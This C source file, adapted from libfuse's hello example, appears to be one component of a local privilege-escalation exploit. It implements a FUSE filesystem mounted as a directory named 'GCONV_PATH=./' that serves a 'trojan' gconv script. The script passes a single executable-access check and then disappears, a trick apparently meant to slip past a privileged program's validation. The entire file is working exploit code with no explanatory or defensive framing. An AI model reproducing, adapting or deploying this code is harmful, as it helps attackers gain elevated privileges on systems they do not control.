// based on example/hello.c from libfuse, released under the terms of the GNU GPL version 2

#define FUSE_USE_VERSION 26
#define _POSIX_C_SOURCE 200809L
#include <fuse.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>

#include "constants.h"

static const char shellscript[] = "#!/bin/sh\nexit 0\n";
static const char scriptpath[] = "/" TROJAN_GCONV_PATH;

static volatile _Bool already_accessed;

static int gconvfuse_getattr(const char *path, struct stat *stbuf)
{
	int res = 0;

	memset(stbuf, 0, sizeof(struct stat));
	if (strcmp(path, "/") == 0) {
		stbuf->st_mode = S_IFDIR | 0755;
		stbuf->st_nlink = 2;
	} else if (strcmp(path, scriptpath) == 0 && !already_accessed) {
		stbuf->st_mode = S_IFREG | 0555;
		stbuf->st_nlink = 1;
		stbuf->st_size = sizeof(shellscript) - 1;
	} else
		res = -ENOENT;

	return res;
}

static int gconvfuse_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
			 off_t offset, struct fuse_file_info *fi)
{
	(void) offset;
	(void) fi;

	if (strcmp(path, "/") != 0)
		return -ENOENT;

	filler(buf, ".", NULL, 0);
	filler(buf, "..", NULL, 0);
	if (!already_accessed)
		filler(buf, scriptpath + 1, NULL, 0);

	return 0;
}

static int gconvfuse_open(const char *path, struct fuse_file_info *fi)
{
	if (strcmp(path, scriptpath) != 0 || already_accessed)
		return -ENOENT;

	if ((fi->flags & 3) != O_RDONLY)
		return -EACCES;

	return 0;
}

static int gconvfuse_read(const char *path, char *buf, size_t size, off_t offset,
		      struct fuse_file_info *fi)
{
	(void) fi;
	const size_t len = sizeof(shellscript) - 1;
	if(strcmp(path, scriptpath) != 0 || already_accessed)
		return -ENOENT;

	if (offset < len) {
		if (offset + size > len)
			size = len - offset;
		memcpy(buf, shellscript + offset, size);
	} else
		size = 0;

	return size;
}

static int gconvfuse_access(const char *path, int mode)
{
	if (strcmp(path, scriptpath) != 0 || already_accessed)
		return -ENOENT;

	switch (mode) {
	case X_OK:
		// only allow access(TROJAN_GCONV_PATH, X_OK) once
		already_accessed = 1;
		// falls through
	case F_OK:
	case R_OK:
		return 0;
	default:
		return -EACCES;
	}
}

static struct fuse_operations gconvfuse_oper = {
	.getattr	= gconvfuse_getattr,
	.readdir	= gconvfuse_readdir,
	.open		= gconvfuse_open,
	.read		= gconvfuse_read,
	.access	= gconvfuse_access,
};

int main(int argc, char *argv[])
{
	already_accessed = 0;
	char *my_argv[] = { argv[0], "-o", "nonempty",
#ifdef GCONV_FUSE_ALLOW_OTHER
		"-o", "allow_root",
#endif
		"GCONV_PATH=./", NULL };
	static const int my_argc =
#ifdef GCONV_FUSE_ALLOW_OTHER
		6;
#else
		4;
#endif
	return fuse_main(my_argc, my_argv, &gconvfuse_oper, NULL);
}
